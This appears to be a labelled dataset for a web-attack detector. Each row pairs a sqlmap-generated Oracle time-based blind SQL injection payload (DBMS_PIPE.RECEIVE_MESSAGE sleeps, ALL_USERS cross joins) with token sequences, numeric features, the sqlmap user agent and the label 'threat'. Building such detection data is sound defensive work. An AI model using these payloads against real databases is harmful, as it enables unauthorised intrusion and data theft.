"johnbaston')) AND 1708=DBMS_PIPE.RECEIVE_MESSAGE(CHR(84)||CHR(72)||CHR(73)||CHR(117),5) AND (('SyUX'='SyUX",STR SQUT RPRN RPRN AND INT EQ STR DOT STR CHR INT OR CHR INT OR CHR INT OR CHR INT CMMA INT AND LPRN LPRN SQUT STR SQUT EQ SQUT STR,0.12903225806451613 0.16129032258064516 0.1935483870967742 0.22580645161290322 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.22580645161290322 0.1935483870967742 0.16129032258064516 0.12903225806451613,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston' AND 1708=DBMS_PIPE.RECEIVE_MESSAGE(CHR(84)||CHR(72)||CHR(73)||CHR(117),5) AND 'iIFu'='iIFu",STR SQUT AND INT EQ STR DOT STR CHR INT OR CHR INT OR CHR INT OR CHR INT CMMA INT AND SQUT STR SQUT EQ SQUT STR,0.14814814814814814 0.18518518518518517 0.2222222222222222 0.25925925925925924 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.25925925925925924 0.2222222222222222 0.18518518518518517 0.14814814814814814,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston' AND 1708=DBMS_PIPE.RECEIVE_MESSAGE(CHR(84)||CHR(72)||CHR(73)||CHR(117),5) AND 'iIFu'='iIFu",STR SQUT AND INT EQ STR DOT STR CHR INT OR CHR INT OR CHR INT OR CHR INT CMMA INT AND SQUT STR SQUT EQ SQUT STR,0.14814814814814814 0.18518518518518517 0.2222222222222222 0.25925925925925924 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.25925925925925924 0.2222222222222222 0.18518518518518517 0.14814814814814814,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston') AND 1708=DBMS_PIPE.RECEIVE_MESSAGE(CHR(84)||CHR(72)||CHR(73)||CHR(117),5) AND ('jttD' LIKE 'jttD",STR SQUT RPRN AND INT EQ STR DOT STR CHR INT OR CHR INT OR CHR INT OR CHR INT CMMA INT AND LPRN SQUT STR SQUT LIKE SQUT STR,0.13793103448275862 0.1724137931034483 0.20689655172413793 0.24137931034482757 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.24137931034482757 0.20689655172413793 0.1724137931034483 0.13793103448275862,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston') AND 1708=DBMS_PIPE.RECEIVE_MESSAGE(CHR(84)||CHR(72)||CHR(73)||CHR(117),5) AND ('jttD' LIKE 'jttD",STR SQUT RPRN AND INT EQ STR DOT STR CHR INT OR CHR INT OR CHR INT OR CHR INT CMMA INT AND LPRN SQUT STR SQUT LIKE SQUT STR,0.13793103448275862 0.1724137931034483 0.20689655172413793 0.24137931034482757 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.24137931034482757 0.20689655172413793 0.1724137931034483 0.13793103448275862,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston' AND 1708=DBMS_PIPE.RECEIVE_MESSAGE(CHR(84)||CHR(72)||CHR(73)||CHR(117),5) AND 'yIWo' LIKE 'yIWo",STR SQUT AND INT EQ STR DOT STR CHR INT OR CHR INT OR CHR INT OR CHR INT CMMA INT AND SQUT STR SQUT LIKE SQUT STR,0.14814814814814814 0.18518518518518517 0.2222222222222222 0.25925925925925924 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.25925925925925924 0.2222222222222222 0.18518518518518517 0.14814814814814814,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston' AND 1708=DBMS_PIPE.RECEIVE_MESSAGE(CHR(84)||CHR(72)||CHR(73)||CHR(117),5) AND 'yIWo' LIKE 'yIWo",STR SQUT AND INT EQ STR DOT STR CHR INT OR CHR INT OR CHR INT OR CHR INT CMMA INT AND SQUT STR SQUT LIKE SQUT STR,0.14814814814814814 0.18518518518518517 0.2222222222222222 0.25925925925925924 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.25925925925925924 0.2222222222222222 0.18518518518518517 0.14814814814814814,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston"") AND 1708=DBMS_PIPE.RECEIVE_MESSAGE(CHR(84)||CHR(72)||CHR(73)||CHR(117),5) AND (""eBOL""=""eBOL",STR DQUT RPRN AND INT EQ STR DOT STR CHR INT OR CHR INT OR CHR INT OR CHR INT CMMA INT AND LPRN DQUT STR DQUT EQ DQUT STR,0.13793103448275862 0.1724137931034483 0.20689655172413793 0.24137931034482757 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.24137931034482757 0.20689655172413793 0.1724137931034483 0.13793103448275862,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston"") AND 1708=DBMS_PIPE.RECEIVE_MESSAGE(CHR(84)||CHR(72)||CHR(73)||CHR(117),5) AND (""eBOL""=""eBOL",STR DQUT RPRN AND INT EQ STR DOT STR CHR INT OR CHR INT OR CHR INT OR CHR INT CMMA INT AND LPRN DQUT STR DQUT EQ DQUT STR,0.13793103448275862 0.1724137931034483 0.20689655172413793 0.24137931034482757 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.24137931034482757 0.20689655172413793 0.1724137931034483 0.13793103448275862,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston"" AND 1708=DBMS_PIPE.RECEIVE_MESSAGE(CHR(84)||CHR(72)||CHR(73)||CHR(117),5) AND ""Fimr""=""Fimr",STR DQUT AND INT EQ STR DOT STR CHR INT OR CHR INT OR CHR INT OR CHR INT CMMA INT AND DQUT STR DQUT EQ DQUT STR,0.14814814814814814 0.18518518518518517 0.2222222222222222 0.25925925925925924 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.25925925925925924 0.2222222222222222 0.18518518518518517 0.14814814814814814,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston%') AND 1708=DBMS_PIPE.RECEIVE_MESSAGE(CHR(84)||CHR(72)||CHR(73)||CHR(117),5) AND ('%'='",STR PRCNT SQUT RPRN AND INT EQ STR DOT STR CHR INT OR CHR INT OR CHR INT OR CHR INT CMMA INT AND LPRN SQUT PRCNT SQUT EQ SQUT,0.13793103448275862 0.1724137931034483 0.20689655172413793 0.24137931034482757 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.24137931034482757 0.20689655172413793 0.1724137931034483 0.13793103448275862,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston%') AND 1708=DBMS_PIPE.RECEIVE_MESSAGE(CHR(84)||CHR(72)||CHR(73)||CHR(117),5) AND ('%'='",STR PRCNT SQUT RPRN AND INT EQ STR DOT STR CHR INT OR CHR INT OR CHR INT OR CHR INT CMMA INT AND LPRN SQUT PRCNT SQUT EQ SQUT,0.13793103448275862 0.1724137931034483 0.20689655172413793 0.24137931034482757 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.24137931034482757 0.20689655172413793 0.1724137931034483 0.13793103448275862,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston%' AND 1708=DBMS_PIPE.RECEIVE_MESSAGE(CHR(84)||CHR(72)||CHR(73)||CHR(117),5) AND '%'='",STR PRCNT SQUT AND INT EQ STR DOT STR CHR INT OR CHR INT OR CHR INT OR CHR INT CMMA INT AND SQUT PRCNT SQUT EQ SQUT,0.14814814814814814 0.18518518518518517 0.2222222222222222 0.25925925925925924 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.25925925925925924 0.2222222222222222 0.18518518518518517 0.14814814814814814,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston) AND 1708=DBMS_PIPE.RECEIVE_MESSAGE(CHR(84)||CHR(72)||CHR(73)||CHR(117),5) AND (5487=5487",STR RPRN AND INT EQ STR DOT STR CHR INT OR CHR INT OR CHR INT OR CHR INT CMMA INT AND LPRN INT EQ INT,0.16 0.2 0.24 0.28 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.28 0.24 0.2 0.16,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston) AND 1708=DBMS_PIPE.RECEIVE_MESSAGE(CHR(84)||CHR(72)||CHR(73)||CHR(117),5) AND (5487=5487",STR RPRN AND INT EQ STR DOT STR CHR INT OR CHR INT OR CHR INT OR CHR INT CMMA INT AND LPRN INT EQ INT,0.16 0.2 0.24 0.28 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.32 0.28 0.24 0.2 0.16,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston)) AND 1708=DBMS_PIPE.RECEIVE_MESSAGE(CHR(84)||CHR(72)||CHR(73)||CHR(117),5) AND ((7386=7386",STR RPRN RPRN AND INT EQ STR DOT STR CHR INT OR CHR INT OR CHR INT OR CHR INT CMMA INT AND LPRN LPRN INT EQ INT,0.14814814814814814 0.18518518518518517 0.2222222222222222 0.25925925925925924 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.2962962962962963 0.25925925925925924 0.2222222222222222 0.18518518518518517 0.14814814814814814,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston AND 1708=DBMS_PIPE.RECEIVE_MESSAGE(CHR(84)||CHR(72)||CHR(73)||CHR(117),5)",STR AND INT EQ STR DOT STR CHR INT OR CHR INT OR CHR INT OR CHR INT CMMA INT,0.21052631578947367 0.2631578947368421 0.3157894736842105 0.3684210526315789 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.3684210526315789 0.3157894736842105 0.2631578947368421 0.21052631578947367,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston AND 1708=DBMS_PIPE.RECEIVE_MESSAGE(CHR(84)||CHR(72)||CHR(73)||CHR(117),5)",STR AND INT EQ STR DOT STR CHR INT OR CHR INT OR CHR INT OR CHR INT CMMA INT,0.21052631578947367 0.2631578947368421 0.3157894736842105 0.3684210526315789 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.42105263157894735 0.3684210526315789 0.3157894736842105 0.2631578947368421 0.21052631578947367,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston') AND 6485=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND ('eBnJ'='eBnJ",STR SQUT RPRN AND INT EQ SELECT STR STAR FROM STR STR CMMA STR STR CMMA STR STR CMMA STR STR CMMA STR STR AND LPRN SQUT STR SQUT EQ SQUT STR,0.12903225806451613 0.16129032258064516 0.1935483870967742 0.22580645161290322 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.22580645161290322 0.1935483870967742 0.16129032258064516 0.12903225806451613,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston') AND 6485=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND ('eBnJ'='eBnJ",STR SQUT RPRN AND INT EQ SELECT STR STAR FROM STR STR CMMA STR STR CMMA STR STR CMMA STR STR CMMA STR STR AND LPRN SQUT STR SQUT EQ SQUT STR,0.12903225806451613 0.16129032258064516 0.1935483870967742 0.22580645161290322 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.22580645161290322 0.1935483870967742 0.16129032258064516 0.12903225806451613,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston')) AND 6485=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND (('yZje'='yZje",STR SQUT RPRN RPRN AND INT EQ SELECT STR STAR FROM STR STR CMMA STR STR CMMA STR STR CMMA STR STR CMMA STR STR AND LPRN LPRN SQUT STR SQUT EQ SQUT STR,0.12121212121212122 0.15151515151515152 0.18181818181818182 0.21212121212121213 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.24242424242424243 0.21212121212121213 0.18181818181818182 0.15151515151515152 0.12121212121212122,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston' AND 6485=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND 'lzIc'='lzIc",STR SQUT AND INT EQ SELECT STR STAR FROM STR STR CMMA STR STR CMMA STR STR CMMA STR STR CMMA STR STR AND SQUT STR SQUT EQ SQUT STR,0.13793103448275862 0.1724137931034483 0.20689655172413793 0.24137931034482757 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.24137931034482757 0.20689655172413793 0.1724137931034483 0.13793103448275862,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston' AND 6485=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND 'lzIc'='lzIc",STR SQUT AND INT EQ SELECT STR STAR FROM STR STR CMMA STR STR CMMA STR STR CMMA STR STR CMMA STR STR AND SQUT STR SQUT EQ SQUT STR,0.13793103448275862 0.1724137931034483 0.20689655172413793 0.24137931034482757 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.27586206896551724 0.24137931034482757 0.20689655172413793 0.1724137931034483 0.13793103448275862,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
"johnbaston') AND 6485=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND ('lSyI' LIKE 'lSyI",STR SQUT RPRN AND INT EQ SELECT STR STAR FROM STR STR CMMA STR STR CMMA STR STR CMMA STR STR CMMA STR STR AND LPRN SQUT STR SQUT LIKE SQUT STR,0.12903225806451613 0.16129032258064516 0.1935483870967742 0.22580645161290322 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.25806451612903225 0.22580645161290322 0.1935483870967742 0.16129032258064516 0.12903225806451613,POST,sqlmap/1.2.4#stable (http://sqlmap.org),threat
